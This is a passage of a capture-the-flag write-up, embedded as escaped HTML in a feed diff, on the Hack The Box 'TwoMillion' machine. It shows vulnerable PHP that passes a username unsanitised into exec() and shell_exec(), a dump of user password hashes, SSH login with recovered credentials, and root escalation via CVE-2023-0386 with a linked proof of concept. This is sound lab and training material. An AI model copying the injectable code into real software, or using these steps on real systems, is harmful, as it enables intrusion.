+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $body &lt;span style="color:#fe8019">=&lt;/span> file_get_contents(&lt;span style="color:#b8bb26">&amp;#39;php://input&amp;#39;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $json &lt;span style="color:#fe8019">=&lt;/span> json_decode($body);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">if&lt;/span> (&lt;span style="color:#fe8019">!&lt;/span>isset($json)) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">return&lt;/span> json_encode([
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#b8bb26">&amp;#39;status&amp;#39;&lt;/span> &lt;span style="color:#fe8019">=&amp;gt;&lt;/span> &lt;span style="color:#b8bb26">&amp;#39;danger&amp;#39;&lt;/span>,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#b8bb26">&amp;#39;message&amp;#39;&lt;/span> &lt;span style="color:#fe8019">=&amp;gt;&lt;/span> &lt;span style="color:#b8bb26">&amp;#39;Missing parameter: username&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ]);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">exit&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">if&lt;/span> (&lt;span style="color:#fe8019">!&lt;/span>$json&lt;span style="color:#fe8019">-&amp;gt;&lt;/span>&lt;span style="color:#b8bb26;font-weight:bold">username&lt;/span>) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">return&lt;/span> json_encode([
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#b8bb26">&amp;#39;status&amp;#39;&lt;/span> &lt;span style="color:#fe8019">=&amp;gt;&lt;/span> &lt;span style="color:#b8bb26">&amp;#39;danger&amp;#39;&lt;/span>,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#b8bb26">&amp;#39;message&amp;#39;&lt;/span> &lt;span style="color:#fe8019">=&amp;gt;&lt;/span> &lt;span style="color:#b8bb26">&amp;#39;Missing parameter: username&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ]);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">exit&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $username &lt;span style="color:#fe8019">=&lt;/span> $json&lt;span style="color:#fe8019">-&amp;gt;&lt;/span>&lt;span style="color:#b8bb26;font-weight:bold">username&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $this&lt;span style="color:#fe8019">-&amp;gt;&lt;/span>&lt;span style="color:#b8bb26;font-weight:bold">regenerate_user_vpn&lt;/span>($router, $username);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $output &lt;span style="color:#fe8019">=&lt;/span> shell_exec(&lt;span style="color:#b8bb26">&amp;#34;/usr/bin/cat /var/www/html/VPN/user/&lt;/span>&lt;span style="color:#b8bb26">$username&lt;/span>&lt;span style="color:#b8bb26">.ovpn&amp;#34;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">return&lt;/span> is_array($output) &lt;span style="color:#fe8019">?&lt;/span> implode(&lt;span style="color:#b8bb26">&amp;#34;&amp;lt;br&amp;gt;&amp;#34;&lt;/span>, $output) &lt;span style="color:#fe8019">:&lt;/span> $output;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>The function is passing the &lt;code>$username&lt;/code> variable to &lt;code>regenerate_user_vpn()&lt;/code> function:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">public&lt;/span> &lt;span style="color:#fe8019">function&lt;/span> &lt;span style="color:#fabd2f">regenerate_user_vpn&lt;/span>($router, $user &lt;span style="color:#fe8019">=&lt;/span> &lt;span style="color:#fe8019">null&lt;/span>) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">if&lt;/span> ($user &lt;span style="color:#fe8019">!=&lt;/span> &lt;span style="color:#fe8019">null&lt;/span>) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> exec(&lt;span style="color:#b8bb26">&amp;#34;/bin/bash /var/www/html/VPN/gen.sh &lt;/span>&lt;span style="color:#b8bb26">$user&lt;/span>&lt;span style="color:#b8bb26">&amp;#34;&lt;/span>, $output, $return_var);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#fe8019">else&lt;/span> {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">if&lt;/span> (&lt;span style="color:#fe8019">!&lt;/span>isset($_SESSION[&lt;span style="color:#b8bb26">&amp;#39;loggedin&amp;#39;&lt;/span>]) &lt;span style="color:#fe8019">||&lt;/span> $_SESSION[&lt;span style="color:#b8bb26">&amp;#39;loggedin&amp;#39;&lt;/span>] &lt;span style="color:#fe8019">!==&lt;/span> &lt;span style="color:#fe8019">true&lt;/span>) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">return&lt;/span> header(&lt;span style="color:#b8bb26">&amp;#34;HTTP/1.1 401 Unauthorized&amp;#34;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">exit&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">if&lt;/span> (&lt;span style="color:#fe8019">!&lt;/span>isset($_SESSION[&lt;span style="color:#b8bb26">&amp;#39;username&amp;#39;&lt;/span>]) &lt;span style="color:#fe8019">||&lt;/span> $_SESSION[&lt;span style="color:#b8bb26">&amp;#39;username&amp;#39;&lt;/span>] &lt;span style="color:#fe8019">==&lt;/span> &lt;span style="color:#fe8019">null&lt;/span>) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">return&lt;/span> header(&lt;span style="color:#b8bb26">&amp;#34;HTTP/1.1 401 Unauthorized&amp;#34;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">exit&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $username &lt;span style="color:#fe8019">=&lt;/span> $this&lt;span style="color:#fe8019">-&amp;gt;&lt;/span>&lt;span style="color:#b8bb26;font-weight:bold">remove_special_chars&lt;/span>($_SESSION[&lt;span style="color:#b8bb26">&amp;#39;username&amp;#39;&lt;/span>]);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $fileName &lt;span style="color:#fe8019">=&lt;/span> $username&lt;span style="color:#fe8019">.&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;.ovpn&amp;#34;&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> exec(&lt;span style="color:#b8bb26">&amp;#34;/bin/bash /var/www/html/VPN/gen.sh &lt;/span>&lt;span style="color:#b8bb26">$username&lt;/span>&lt;span style="color:#b8bb26">&amp;#34;&lt;/span>, $output, $return_var);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $this&lt;span style="color:#fe8019">-&amp;gt;&lt;/span>&lt;span style="color:#b8bb26;font-weight:bold">download_vpn&lt;/span>($fileName);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>The function is using &lt;code>exec()&lt;/code> function to generate the vpn file if simply &lt;code>$user&lt;/code> is not &lt;code>null&lt;/code>. Great.&lt;/p>
+&lt;p>Anyway&amp;hellip; let&amp;rsquo;s move on to the next step.&lt;/p>
+&lt;h3 id="lateral-movement-vector">Lateral Movement vector&lt;/h3>
+&lt;p>First let&amp;rsquo;s login to mysql.&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/two-million/mysql-login.webp">&lt;/figure>
+&lt;p>There are two tables - &lt;code>invite_codes&lt;/code> and &lt;code>users&lt;/code>:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-mysql" data-lang="mysql">&lt;span style="display:flex;">&lt;span>MariaDB [htb_prod]&lt;span style="color:#fe8019">&amp;gt;&lt;/span> &lt;span style="color:#fe8019">show&lt;/span> &lt;span style="color:#fe8019">tables&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">+--------------------+&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">|&lt;/span> Tables_in_htb_prod &lt;span style="color:#fe8019">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">+--------------------+&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">|&lt;/span> invite_codes &lt;span style="color:#fe8019">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">|&lt;/span> users &lt;span style="color:#fe8019">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">+--------------------+&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d3869b">2&lt;/span> rows &lt;span style="color:#fe8019">in&lt;/span> &lt;span style="color:#fabd2f">set&lt;/span> (&lt;span style="color:#d3869b">0&lt;/span>.&lt;span style="color:#d3869b">000&lt;/span> sec)
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/two-million/mysql-tables.webp">&lt;/figure>
+&lt;p>&lt;code>invite_codes&lt;/code> probably contain the codes for the invite challenge. We could find usernames and credentials of the accounts created in the &lt;code>users&lt;/code> table:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-mysql" data-lang="mysql">&lt;span style="display:flex;">&lt;span>MariaDB [htb_prod]&lt;span style="color:#fe8019">&amp;gt;&lt;/span> &lt;span style="color:#fe8019">select&lt;/span> &lt;span style="color:#fe8019">*&lt;/span> &lt;span style="color:#fe8019">from&lt;/span> users;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">+----+--------------+----------------------------+--------------------------------------------------------------+----------+&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">|&lt;/span> id &lt;span style="color:#fe8019">|&lt;/span> username &lt;span style="color:#fe8019">|&lt;/span> email &lt;span style="color:#fe8019">|&lt;/span> password &lt;span style="color:#fe8019">|&lt;/span> is_admin &lt;span style="color:#fe8019">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">+----+--------------+----------------------------+--------------------------------------------------------------+----------+&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">|&lt;/span> &lt;span style="color:#d3869b">11&lt;/span> &lt;span style="color:#fe8019">|&lt;/span> TRX &lt;span style="color:#fe8019">|&lt;/span> trx&lt;span style="color:#fe8019">@&lt;/span>hackthebox.eu &lt;span style="color:#fe8019">|&lt;/span> $&lt;span style="color:#d3869b">2&lt;/span>y$&lt;span style="color:#d3869b">10&lt;/span>$TG6oZ3ow5UZhLlw7MDME5um7j&lt;span style="color:#fe8019">/&lt;/span>&lt;span style="color:#d3869b">7&lt;/span>Cw1o6BhY8RhHMnrr2ObU3loEMq &lt;span style="color:#fe8019">|&lt;/span> &lt;span style="color:#d3869b">1&lt;/span> &lt;span style="color:#fe8019">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">|&lt;/span> &lt;span style="color:#d3869b">12&lt;/span> &lt;span style="color:#fe8019">|&lt;/span> TheCyberGeek &lt;span style="color:#fe8019">|&lt;/span> thecybergeek&lt;span style="color:#fe8019">@&lt;/span>hackthebox.eu &lt;span style="color:#fe8019">|&lt;/span> $&lt;span style="color:#d3869b">2&lt;/span>y$&lt;span style="color:#d3869b">10&lt;/span>$wATidKUukcOeJRaBpYtOyekSpwkKghaNYr5pjsomZUKAd0wbzw4QK &lt;span style="color:#fe8019">|&lt;/span> &lt;span style="color:#d3869b">1&lt;/span> &lt;span style="color:#fe8019">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">|&lt;/span> &lt;span style="color:#d3869b">13&lt;/span> &lt;span style="color:#fe8019">|&lt;/span> admin &lt;span style="color:#fe8019">|&lt;/span> admin&lt;span style="color:#fe8019">@&lt;/span>admin.com &lt;span style="color:#fe8019">|&lt;/span> $&lt;span style="color:#d3869b">2&lt;/span>y$&lt;span style="color:#d3869b">10&lt;/span>$N.hsJNfoYPGV3SGCcTYcmO5CeJ6P6mDxJS11jmAX4C&lt;span style="color:#fe8019">/&lt;/span>FZ2qzEX8Qm &lt;span style="color:#fe8019">|&lt;/span> &lt;span style="color:#d3869b">1&lt;/span> &lt;span style="color:#fe8019">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">|&lt;/span> &lt;span style="color:#d3869b">14&lt;/span> &lt;span style="color:#fe8019">|&lt;/span> randomuser &lt;span style="color:#fe8019">|&lt;/span> randomuser&lt;span style="color:#fe8019">@&lt;/span>&lt;span style="color:#d3869b">2&lt;/span>million.htb &lt;span style="color:#fe8019">|&lt;/span> $&lt;span style="color:#d3869b">2&lt;/span>y$&lt;span style="color:#d3869b">10&lt;/span>$MdxNNwxCAbufgaCEMsv7SeHG4yLyB551P40eAtOpqDDGJOiZHoT&lt;span style="color:#fe8019">/&lt;/span>S &lt;span style="color:#fe8019">|&lt;/span> &lt;span style="color:#d3869b">1&lt;/span> &lt;span style="color:#fe8019">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">+----+--------------+----------------------------+--------------------------------------------------------------+----------+&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d3869b">4&lt;/span> rows &lt;span style="color:#fe8019">in&lt;/span> &lt;span style="color:#fabd2f">set&lt;/span> (&lt;span style="color:#d3869b">0&lt;/span>.&lt;span style="color:#d3869b">000&lt;/span> sec)
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/two-million/mysql-users.webp">&lt;/figure>
+&lt;p>Nothing specific.&lt;/p>
+&lt;p>Let&amp;rsquo;s try ssh using the username and the password we got.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span> ssh admin@10.10.11.221
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>admin@10.10.11.221s password:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>admin@2million:~$ id
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>uid&lt;span style="color:#fe8019">=&lt;/span>1000&lt;span style="color:#fe8019">(&lt;/span>admin&lt;span style="color:#fe8019">)&lt;/span> gid&lt;span style="color:#fe8019">=&lt;/span>1000&lt;span style="color:#fe8019">(&lt;/span>admin&lt;span style="color:#fe8019">)&lt;/span> groups&lt;span style="color:#fe8019">=&lt;/span>1000&lt;span style="color:#fe8019">(&lt;/span>admin&lt;span style="color:#fe8019">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>admin@2million:~$ whoami
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>admin
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>admin@2million:~$ cat user.txt
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>****************************
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/two-million/ssh.webp">&lt;/figure>
+&lt;p>Alright we got logged in as &lt;code>admin&lt;/code> user.&lt;/p>
+&lt;hr>
+&lt;h2 id="privilege-escalation">Privilege Escalation&lt;/h2>
+&lt;h3 id="local-enumeration-1">Local Enumeration&lt;/h3>
+&lt;p>First things first:&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/two-million/sudo-test.webp">&lt;/figure>
+&lt;p>After some enumeration found &lt;code>/var/mail/admin&lt;/code> file is readable by the admin user and may contain something interesting I mean exposition:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>admin@2million:~$ find / -type f -user admin -readable 2&amp;gt;/dev/null
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/two-million/readable-files.webp">&lt;/figure>
+&lt;p>As I said, not so creative but considering the burden of being an easy box it is okay&amp;hellip;&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/two-million/mail.webp">&lt;/figure>
+&lt;p>After searching a bit about OverlayFS kernel exploits I found this one: &lt;a href="https://nvd.nist.gov/vuln/detail/CVE-2023-0386">CVE-2023-0386&lt;/a>&lt;/p>
+&lt;h3 id="privilege-escalation-vector">Privilege Escalation vector&lt;/h3>
+&lt;h4 id="cve-2023-0386">CVE 2023 0386&lt;/h4>
+&lt;p>Check this awesome &lt;a href="https://securitylabs.datadoghq.com/articles/overlayfs-cve-2023-0386/">blog&lt;/a> from &lt;a href="https://securitylabs.datadoghq.com/">Datadog Security Labs&lt;/a> to know more about the exploit. We can use this &lt;a href="https://github.com/sxlmnwb/CVE-2023-0386">POC&lt;/a> to exploit the vulnerability.&lt;/p>
+&lt;p>Looks like someone already did it for me and forgot to clean it up:&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/two-million/poc-in-tmp.webp">&lt;/figure>
+&lt;p>Anyway&amp;hellip;&lt;/p>
+&lt;p>We can use it to exploit and escalate into the root user:&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/two-million/poc-readme.webp">&lt;/figure>
+&lt;p>Since the machine have &lt;code>tmux&lt;/code> already installed, we can use it to run the exploits in two seperate window:&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/two-million/exploit.webp">&lt;/figure>
+&lt;p>And that&amp;rsquo;s it, we got the root shell!!&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>root@2million:/# whoami
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>root
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>root@2million:/# id
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>uid&lt;span style="color:#fe8019">=&lt;/span>0&lt;span style="color:#fe8019">(&lt;/span>root&lt;span style="color:#fe8019">)&lt;/span> gid&lt;span style="color:#fe8019">=&lt;/span>0&lt;span style="color:#fe8019">(&lt;/span>root&lt;span style="color:#fe8019">)&lt;/span> groups&lt;span style="color:#fe8019">=&lt;/span>0&lt;span style="color:#fe8019">(&lt;/span>root&lt;span style="color:#fe8019">)&lt;/span>,1000&lt;span style="color:#fe8019">(&lt;/span>admin&lt;span style="color:#fe8019">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>root@2million:/# cat /root/root.txt
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>****************************
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>root@2million:/#
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/two-million/root.webp">&lt;/figure>
+&lt;hr>
+&lt;p>Overall this was a fun easy box. I was able to get into the working of the api by checking the php files and it was fun. There&amp;rsquo;s also a fun easter egg kind of thing hidden inside the root directory, so if you are interested try to find it out yourself. This box also helped me to learn more about &lt;code>CVE-2023-0386&lt;/code>. Maybe I will write about the vulnerability in detail in some other blog.&lt;/p></content></item></channel></rss>
